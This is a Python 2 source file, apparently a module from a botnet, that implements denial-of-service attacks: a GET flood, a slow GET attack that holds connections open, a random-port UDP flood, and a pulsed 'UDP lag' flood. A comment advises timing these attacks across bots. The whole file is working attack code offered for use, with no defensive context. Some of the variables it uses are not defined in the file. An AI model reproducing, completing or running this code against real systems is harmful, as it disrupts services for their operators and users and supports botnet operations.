import socket
import urlparse
import time

# GET Flood
def getdos(url, port, dostime):
	url = urlparse.urlparse(url)
	path = url.path
	if path == "": path = "/"
	host = url.netloc
	req = "GET " + path + " HTTP/1.0\r\n\r\n"
	print 'GET attack starting...'
	while int(dostime) > time.time():
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			sock.settimeout(0.25)
			sock.connect((host, int(port)))
			sock.send(req)
			data = (sock.recv(30))
			data = data.split("\r\n")
			data = data[0]
			sock.shutdown(1)
			sock.close()
			print "GET"
		except:
			print "Fail"
	print 'GET attack over...'

# Slow GET attack, holds connections open by sending and reading slow
def getslowdos(url, port, dostime):
	url = urlparse.urlparse(url)
	path = url.path
	if path == "": path = "/"
	host = url.netloc
	req = "GET " + path + " HTTP/1.0\r\nHost: " + host + "\r\nUser-Agent: " + useragent + "\r\n" + headers + "\r\n\r\n"
	req = req.encode('utf-8')
	print 'GET attack starting...'
	while int(dostime) > time.time():
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
			sock.settimeout(30)
			sock.connect((host, int(port)))
			for x in req:
				sock.send(x)
				time.sleep(.05)
			data = ''
			for x in range(30):
				data = data + (sock.recv(1))
				time.sleep(.05)
			data = data.split("\r\n")
			data = data[0]
			sock.shutdown(1)
			sock.close()
			print "GET"
		except:
			print "Fail"
			time.sleep(.5)
	print 'GET attack over...'

# UDP Flood
def udpdos(ip, port, dostime, psize):
	sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

	while int(dostime) > time.time():
		if port == 'rand':
			portsend = random.randrange(1, 65535, 2)
		else:
			portsend = int(port)
		try:
			bytes = random._urandom(psize)
			sock.sendto(bytes,(ip, portsend))
			print "UDP"
		except:
			print "Fail"

# UDP Lag
# To get it working in the botnet the knocktime needs to be as low as possible and have time for all bots to adjust before using. recomended is 5-10 seconds 
def udplagdos(ip, port, dostime, psize):
	sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

	while int(dostime) > time.time():
		stopat = time.time() + 20
		while time.time() < stopat:
			if port == 'rand':
				portsend = random.randrange(1, 65535, 2)
			else:
				portsend = int(port)
			try:
				bytes = random._urandom(psize)
				sock.sendto(bytes,(ip, portsend))
				print "UDP"
			except:
				print "Fail"
		time.sleep(10)
